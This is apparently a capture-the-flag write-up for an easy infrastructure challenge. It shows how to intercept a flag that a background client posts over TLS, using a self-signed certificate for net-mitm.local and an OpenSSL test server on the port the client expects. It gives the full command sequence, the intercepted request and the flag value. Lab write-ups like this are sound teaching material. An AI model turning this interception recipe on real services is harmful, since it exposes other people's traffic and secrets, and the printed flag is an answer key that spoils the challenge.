\# Net MITM TLS - Writeup



\*\*Category:\*\* Infra  

\*\*Difficulty:\*\* Easy



\## Challenge Description



A background service periodically sends a secret flag over TLS to:



```

https://net-mitm.local:4443/submit

```



Our goal was to intercept this communication by pretending to be the server.



\---



\# Solution



\## Step 1 - Connect to the challenge



We connected to the provided shell using netcat.



```bash

nc 13.206.57.188 10029

```



After connecting, we checked the environment.



```bash

id

pwd

ls -la

cat /etc/hosts

```



We noticed an important entry in `/etc/hosts`:



```text

127.0.0.1 net-mitm.local

```



This meant that whenever the background client tried to connect to `net-mitm.local`, it actually connected to \*\*localhost\*\*.



\---



\## Step 2 - Create a fake TLS certificate



We moved to `/tmp` because `/app` was not writable.



```bash

cd /tmp

```



Then we created a self-signed certificate for the hostname `net-mitm.local`.



```bash

openssl req -x509 -newkey rsa:2048 -nodes \\

\-keyout key.pem \\

\-out cert.pem \\

\-days 1 \\

\-subj "/CN=net-mitm.local" \\

\-addext "subjectAltName=DNS:net-mitm.local"

```



This generated two files:



\- `cert.pem`

\- `key.pem`



\---



\## Step 3 - Start a fake TLS server



We started OpenSSL's built-in TLS server on port \*\*4443\*\*.



```bash

openssl s\_server -accept 4443 -cert cert.pem -key key.pem

```



The server waited for incoming TLS connections.



\---



\## Step 4 - Wait for the background client



After a short time, the background service automatically connected to our fake server.



The intercepted request looked like this:



```http

POST /submit HTTP/1.1

Host: net-mitm.local

Content-Length: 24



athena{VaWxp34r8MIVXeGH}

```



The server later printed an error because it did not send a proper HTTP response:



```

unexpected eof while reading

Broken pipe

```



This error was expected and did not affect the challenge because the flag had already been received.



\---



\# Flag



```text

athena{VaWxp34r8MIVXeGH}

```



\---



\# What We Learned



\- The client trusted any certificate as long as it matched the hostname.

\- Since `net-mitm.local` resolved to `127.0.0.1`, we could run our own TLS server locally.

\- By creating a certificate for the expected hostname and listening on port `4443`, we intercepted the flag sent by the background service.

